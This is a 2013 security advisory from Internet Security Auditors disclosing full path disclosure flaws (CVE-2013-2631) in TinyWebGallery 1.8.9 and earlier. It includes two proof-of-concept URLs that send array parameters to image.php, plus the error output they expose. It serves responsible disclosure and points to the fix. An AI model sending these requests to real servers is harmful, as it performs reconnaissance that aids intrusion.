
Date: Sat, 06 Apr 2013 12:13:17 -0500
From: ISecAuditors Security Advisories <advisories@...cauditors.com>
To: bugs@...uritytracker.com, news@...uriteam.com,
  full-disclosure@...ts.grok.org.uk, vuln@...unia.com,
  packet@...ketstormsecurity.org, bugtraq@...urityfocus.com
Subject: [ISecAuditors Security Advisories] Multiple Full Path Disclosure
 Vulnerabilities in TinyWebGallery <= v1.8.9

=============================================
INTERNET SECURITY AUDITORS ALERT 2013-012
- Original release date: March 19th, 2013
- Last revised:  April 6th, 2013
- Discovered by: Manuel Garcia Cardenas
- Severity: 5/10 (CVSS Base Score)
- CVE-ID: CVE-2013-2631
=============================================

I. VULNERABILITY
-------------------------
Multiple Full Path Disclosure Vulnerabilities in TinyWebGallery <= v1.8.9

II. BACKGROUND
-------------------------
TinyWebGallery (TWG) is a photo album / gallery released under a
modified Open Source license GPL. It is a server based gallery script
for images which uses Ajax, PHP, XML and the graphic library Gdlib /
ImageMagick.

III. DESCRIPTION
-------------------------
This vulnerability could allow a malicious user to view the internal
path information of the host due to some files were missing the check
the inclusion of libraries.

The error is generated through the parameters "twg_browserx" and
"twg_browsery" in the page image.php.

IV. PROOF OF CONCEPT
-------------------------
The attacker can get the full path of the installation of
TinyWebGallery browsing to any of this urls:

http://vulnerablesite.com/tw/image.php?fontscale=1&twg_browserx[]=1706&twg_browsery=890&twg_xmlhttp=r

http://vulnerablesite.com/tw/image.php?fontscale=1&twg_browserx=1706&twg_browsery[]=890&twg_xmlhttp=r

The information obtained contains the full path to the files:

Fatal error: Unsupported operand types in
/var/www/tw/inc/ajaxserver.inc.php on line 157

V. BUSINESS IMPACT
-------------------------
Full path disclosure vulnerabilities enables an attacker to know the
path to the web root. This information can be used in order to launch
further attacks.

VI. SYSTEMS AFFECTED
-------------------------
TinyWebGallery <=1.8.9

VII. SOLUTION
-------------------------
Update to version 1.9

VIII. REFERENCES
-------------------------
http://www.tinywebgallery.com
http://www.isecauditors.com

IX. CREDITS
-------------------------
This vulnerability has been discovered
by Manuel Garcia Cardenas (mgarcia (at) isecauditors (dot) com).

X. REVISION HISTORY
------------------------
March    19, 2013: Initial release.
April     6, 2013: Final release.

XI. DISCLOSURE TIMELINE
-------------------------
March    19, 2013: Vulnerability acquired by
                   Internet Security Auditors (www.isecauditors.com)
March    21, 2013: Send to Vendor.
March    21, 2013: New version that includes patched code.
April     6, 2013: Sent to lists.

XII. LEGAL NOTICES
-------------------------
The information contained within this advisory is supplied "as-is"
with no warranties or guarantees of fitness of use or otherwise.
Internet Security Auditors accepts no responsibility for any damage
caused by the use or misuse of this information.

XIII. ABOUT
-------------------------
Internet Security Auditors is a Spain based leader in web application
testing, network security, penetration testing, security compliance
implementation and assessing. Our clients include some of the largest
companies in areas such as finance, telecommunications, insurance,
ITC, etc. We are vendor independent provider with a deep expertise
since 2001. Our efforts in R&D include vulnerability research, open
security project collaboration and whitepapers, presentations and
security events participation and promotion. For further information
regarding our security services, contact us.

XIV. FOLLOW US
-------------------------
You can follow Internet Security Auditors, news and security
advisories at:
https://www.facebook.com/ISecAuditors
https://twitter.com/ISecAuditors
http://www.linkedin.com/company/internet-security-auditors
http://www.youtube.com/user/ISecAuditors
